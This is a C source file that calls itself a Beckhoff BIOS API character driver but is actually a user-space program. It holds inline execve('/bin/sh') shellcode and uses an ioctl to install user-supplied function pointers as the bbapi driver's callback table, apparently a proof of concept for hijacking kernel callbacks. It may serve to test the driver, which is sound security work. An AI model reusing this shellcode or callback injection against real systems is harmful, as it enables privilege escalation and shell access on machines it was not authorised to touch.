/**
    Character Driver for Beckhoff BIOS API
    Author: 	Patrick Brünn <p.bruenn@beckhoff.com>
    Copyright (C) 2013 - 2014  Beckhoff Automation GmbH

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
*/

#include <stdint.h>
#include <stdio.h>
#include <stropts.h>
#include <fcntl.h>
#include <unistd.h>
#include "bbapi.h"

uint32_t __open_shell(uint32_t reg, uint32_t *hi, uint32_t *lo)
{
  __asm("\
needle0: jmp there\n\
here:    pop %rdi\n\
         xor %rax, %rax\n\
         movb $0x3b, %al\n\
         xor %rsi, %rsi\n\
         xor %rdx, %rdx\n\
         syscall\n\
there:   call here\n\
.string \"/bin/sh\"\n\
needle1: .octa 0xdeadbeef\n\
  ");
  return 0;
}

extern uint32_t reboot(uint32_t reg, uint32_t *hi, uint32_t *lo);
extern uint32_t __do_nop(uint32_t reg, uint32_t *hi, uint32_t *lo);
extern uint32_t ExtOsReadMSR(uint32_t reg, uint32_t *hi, uint32_t *lo);
extern uint32_t ExtOsWriteMSR(uint32_t reg, uint32_t hi, uint32_t lo);

struct bbapi_callback {
	uint8_t name[8];
	uint64_t func;
};

static struct bbapi_callback CALLBACKS[] = {
	{{"READMSR\0"}, (uint64_t)&__do_nop},
	{{"GETBUSDT"}, (uint64_t)&__do_nop},
	{{"MAPMEM\0\0"}, (uint64_t)&__do_nop},
	{{"UNMAPMEM"}, (uint64_t)&__do_nop},
	{{"WRITEMSR"}, (uint64_t)&__do_nop},
	{{"SETBUSDT"}, (uint64_t)&__do_nop},
	{{"\0\0\0\0\0\0\0\0"}, 0},
};

int ioctl_write(int file, unsigned long group, unsigned long offset, void* in, unsigned long size)
{
	struct bbapi_struct data = {
		.nIndexGroup = group,
		.nIndexOffset = offset,
		.pInBuffer = in,
		.nInBufferSize = size,
		.pOutBuffer = NULL,
		.nOutBufferSize = 0,
	};
	if (-1 == ioctl(file, BBAPI_CMD, &data)) {
		printf("%s(): failed for group: 0x%lx offset: 0x%lx\n", __FUNCTION__, group, offset);
		return -1;
	}
	return 0;
}

void bbapi_callbacks_install(void)
{
	int file = open(FILE_PATH, O_RDWR);
	if ( -1 == file) {
		printf("Open '%s' failed\n", FILE_PATH);
		return;
	}
	ioctl_write(file, 0x00000000, 0x000000FE, &CALLBACKS, 5*sizeof(struct bbapi_callback));
	close(file);
}

int main(int argc, char *argv[])
{
	//__open_shell(0, NULL, NULL);
	//__do_nop(0, NULL, NULL);
	//printf("ExtOsReadMSR(): %u\n", ExtOsReadMSR(0, NULL, NULL));
	//printf("ExtOsWriteMSR(): %u\n", ExtOsWriteMSR(0, 0, 0));
	bbapi_callbacks_install();
}
